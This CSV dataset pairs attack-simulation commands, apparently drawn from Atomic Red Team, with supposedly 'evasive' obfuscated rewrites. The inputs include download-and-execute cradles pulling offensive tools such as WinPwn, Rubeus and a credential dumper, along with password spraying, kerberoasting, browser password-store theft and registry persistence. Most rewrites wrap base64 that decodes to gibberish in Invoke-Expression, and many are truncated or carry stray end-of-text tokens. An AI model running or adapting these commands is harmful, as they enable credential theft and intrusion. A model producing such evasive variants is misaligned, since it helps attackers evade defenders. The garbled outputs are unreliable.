input,evasive_commands
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""","Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse C:\ProgramData\Microsoft\Windows\Start Menu\Program"
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name},"esentutl.exe /y /vss """" /d """"  """" ""   \""\""\""\""   \""""""\""        "" ""  ""<|endof"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAtUHJvY2VzcyAje2ludGVybW9kaToKICAgIEFkZCB7XG5hc3NldHMgPSB7IG5vdGljfQ==')) | Invoke-Expression"""
reg delete \PersonalizationCSP,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxvIC97dGVtcF9zdHJpbmcoI3tjZXJ0IC1kaXRvdXIgYWRkcmVzcyAiQWNjb3VudCAtZXhlYyBmaWxlfSBmcm9t"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{7zip_exe}"" u archive.7z *txt -pblue
dir","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmFkb2Jlc3QgIi5leHBvcC5yZXRwcmVzcyAje2RldmljZSAnIHRlbXAgdGhpcnM=')) | Invoke-Expression""<"
"$Action = New-ScheduledTaskAction -Execute ""calc.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object",$Action = New-ScheduledTaskAction -Execute calc.exe ||| $Trigger = New-ScheduledTaskTrigger -AtLogon ||| $User = New-ScheduledTaskPrincipal -GroupId BUILTIN\Administrators -RunLevel Highest ||| $Set = New-ScheduledTaskSettingsSet ||| $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask
"Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGF0YSBDb25uZWN0aW9uICN7cmVzb3VyY2VzIHN1cHBvcnQgPjxkaXJlY3Rpb24+UmVzdWx0IC1jKTs='"
"$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = ""#{legal_notice_caption}""
$newLegalNoticeText = ""#{legal_notice_text}""
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG51bGwsZXhlY3V0aW9uICR7d2hhdC1zZWNyZXQgLUFkZHJlc3MxIiAvYmlnfSBmcm9tICN7YWRtaW4vbmF"
pktmon.exe filter add -p 445,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGtpLmV4ZSAje2RldmljZXMiIHt7IC1TdHJpbmdAYWxsIlN0b3Jlcl9zZWNyZXQgOik=')) | Invoke-Expression"""
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbHN1YmRhdGEgJiAvZXhlIC9GaWxlcHRpb25zLnBvcCAtIiAvZXhlIC9Qcm9jZXNzaWduLlJFbnRpdGxlcmlu"
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""
cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHl9bWUgZmllclRvIGxpc3QgcGFzc3dvcmQ=')) | Invoke-Expression"""
"tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG90YWxTZXJ2aWNlLmNvbSBjb21wbGV4IHVwZ3MgbmFtZSAje3ByZWFjdCAtZnVuY3Rpb25zIC9hIGFyZSBkYX"
#{compiled_file} #{source_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYWxlbmRhcmVzIC1kZXN0LmFuZHJlc3MgI2Nsb3VkLmlvIC9maWxlfSAiQXBwbGljYXRpb25fc3RhdGVtcCA"
$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB0aGUgLXBvbmVudCAje3tvcGVyIC9wYWNrZWQgLXBvbCBBbHdheSBkbyAje2Nsb3NlfSI=')) | Invoke-Expression"""
"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3Byb2R1Y3QiIHtleGUuZXhlICJlbi5hcHA=')) | Invoke-Expression"""
"get-process | ?{$_.Description -like ""*virus*""}
get-process | ?{$_.Description -like ""*carbonblack*""}
get-process | ?{$_.Description -like ""*defender*""}
get-process | ?{$_.Description -like ""*cylance*""}
get-process | ?{$_.Description -like ""*mc*""}
get-process | ?{$_.ProcessName -like ""*mc*""}
get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }","powershell get-process | ?{$_.Description -like ""*virus*""};get-process | ?{$_.Description -like ""*carbonblack*""};get-process | ?{$_.Description -like ""*defender*""};get-process | ?{$_.Description -like ""*cylance*""};get-process | ?{$_.Description -like ""*mc*""};get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }<|"
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force,IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
regedit {PATH_ABSOLUTE}:regfile.reg,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZm9vICJ7bWlzc2luZy9zdHlsZXN0YWNrIjtzcmMgL3ByaW5nIG1haWwuY2hlY2tlbmQ=')) | Invoke-Expression""<"
"if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""","New-Item -ItemType Key -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun if (!(Test-Path -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun)){ Set-ItemProperty -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun -Name -Value Set-ItemProperty -Path  ""HK"
verclsid.exe /S /C {CLSID},"""v""e""r""c""l""s""i""d"".exe /S /C {CLSID} ||| ```"
"cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}","cd """"split ""-b"" ""5000000"" """" """"split ""-b"" ""5000000"" """" """"split ""-b"" ""50000"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\T10"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXcmFwLXVzZWQgYnVpbGRvbmEsIEhlbGxpbnN0ZXIoUkVHSU5TKSAiICJzdGVhbGNvbXAiOiJBUEkgVEVTVEFMRSAtMj"
"""#{vboxmanage_exe}"" createvm --name ""#{vm_name}"" --register
""#{vboxmanage_exe}"" modifyvm ""#{vm_name}"" --firmware efi
""#{vboxmanage_exe}"" startvm ""#{vm_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLWxvYWRpbmcgImF1dGhvcml6ZXIgLVN0YWNrIC9TdHJpbmdzIiAje2lkOjEwMDB9')) | Invoke-Expression""<|endof"
net user administrator /domain,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5Db21taXR9Cg==')) | Invoke-Expression"""
"rundll32.exe ""#{input_file}"",#2","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhbGwgI3tmaWxlfSIje1VTRVIuZXhlIiAtYWRtaW5pc3RyYWN0aW9uczogJHNvbWUtbWFpbC5jb20=')) | Invoke-Expression""<|"
"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3VzdG9tUGludGVyZSBleHRyYWN0IHJ1aWxkUmVnaXN0cnkgd2FzIGRldmljZSBjb250ZW50LnRhcCAtIFRoZSBDYW"
runexehelper.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9pbnRzX2ZpbGVfc3VkbyB7IHJldHVybiAje25vbmUgLWd1YWxpY190aWw=')) | Invoke-Expression"""
Get-ADComputer #{hostname} -Properties *,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNlcnZpY2UgI3tmaWxlfQ==')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjIC9Db250ZW50X1JFQURfUElTIFRydWUgKHsgLVxuYmFzaCAiSEtvcmRlciAje2NvbSArCiAgIC9Mb2dldHByZX"
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wdCAtbWljcml0LXVwZGF0ZSAtY2xpcFBhcmVudCB7IHNpemUgLSBkbyBjYXJkbGVzICN7ZWNobyAiUEMuRlVBQy"
"$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEgICNcVXRzZWNpcG9pbnQudHlwZUlkIiAvYmluLmF3cy5leGUucGRm')) | Invoke-Expression"""
"wmic process get caption,executablepath,commandline /format:csv","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGFpbHMgLXBhdHRlcm5zIC1uZXV0aCAtIiN7bW9kaWZpZWR9')) | Invoke-Expression"""
"Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""","Start-Process ""\""Sysinternals\accesschk.exe"""" -AcceptEula . Start-Process"" -ArgumentList """"-acc<|end"
diantz /f {PATH:.ddf},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YVxhbmd1YWdlICIje3tleSAiICN7dXBncm91bmQgLyJ9')) | Invoke-Expression"" ||| ```"
"net localgroup
net localgroup ""Administrators""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IHdoZXJlIGh0dHA6Ly9sb2NhbC5jcnlwdG9wfSAtIGh0dHA6Ly9uZXQveGNsdXN0ZXItcmVhb"
"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}",if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~Library/LaunchAgents/#{plist_filename} sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
"$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f       
}
else{
  Write-Host ""32-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""","$wdApp = New-Object -COMObject Word.Application if(-not $wdApp.path.contains(""Program Files (x86)"")) {Write-Host ""64-bit Office""reg add HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf /t REG_SZ /d PathToAtomicsFolder\T1137.002\bin\officetest_x6"
rundll32.exe -sta {CLSID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9ydHMgLXN5bnRheCAje3ByaW1hcnkgI3tleCAtbGVlYnkucmVtb3ZpZXJz')) | Invoke-Expression"""
"Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }","Add-Type -AssemblyName System.IdentityModel setspn.exe -T -Q */* | Select-String CN -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
"cat /etc/passwd > #{output_file}
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRvZXMgI3tmaWxlIC1uZXQsCiAgcmVmZXJyb3JzOiN7aHJlc2hvbG9nLmhlYWRlci5jb20=')) | Invoke-"
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi","if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi"
"rundll32.exe advpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZhbHNlfQ==')) | Invoke-Expression"""
"$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHsgIiAje3t7YW5vbnltb3VzLmNvbTpjb2RlX2FkbWluZ1ByaWNlfSIgPj0xMDB9ICdyZWdldGVycml0eXBlLm5hb"
"Write-Host 1.Downloading KeyScrambler from official website to temp directory
Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe
Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe
Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
Start-Process -FilePath $env:Temp\KeyScrambler.exe
Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBwYXNzd29yZDsgJ0hlbHZldGljYSAtMTIzNDU=')) | Invoke-Expression"""
"nscurl -k ""#{remote_file}"" -o ""#{destination_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bm90IC1jb25maWcgI3tmaWxlfSIje1Byb2Nlc3MiPiJhYm91dCIsInRvcGljLXBhdGgiOiAiZWRpdCJ9')) | Invoke-Expression""<"
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvYWRzIHNvbWVwbG9hZCBmaXJzdF9jb2Rl')) | Invoke-Expression"""
"$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}",$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBqdXN0IHRleHQgZmllbGRzICJjc2xkLWtleSBTb2Z0fSI=')) | Invoke-Expression"""
"rundll32.exe {PATH_SMB:.dll},EntryPoint","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGluZw==dHlwZQ==')) | Invoke-Expression"""
tttracer.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhhbCAtZW5kc3RyYWNrLm1vZGVsX2lkfQ==')) | Invoke-Expression"" ||| ```"
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""
$ver = (New-Object -COMObject ""PowerPoint.Application"").version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad""
New-Item -type Directory $ExcelRegPath -Force | Out-Null
New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD  | Out-Null
New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null
Stop-Process -Name ""PowerPnt"" -ErrorAction Ignore
Start-Process ""PowerPnt""","Copy PathToAtomicsFolder T1137.006 bin Addins PptVBAaddin.ppam $env:APPDATA Microsoft Addins notepad PowerPoint AddIns notepad Autoload 1 Path notepad.ppam -value ""1"" -propertyType DWORD New-ItemProperty $ExcelRegPath Path -value ""notepad.ppam"" -propertyType string Stop-Process -Name PowerPnt -"
Clear-History,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q09ORFJBVEhfRVJST1IuZXhlICN7c2lja2V0')) | Invoke-Expression"""
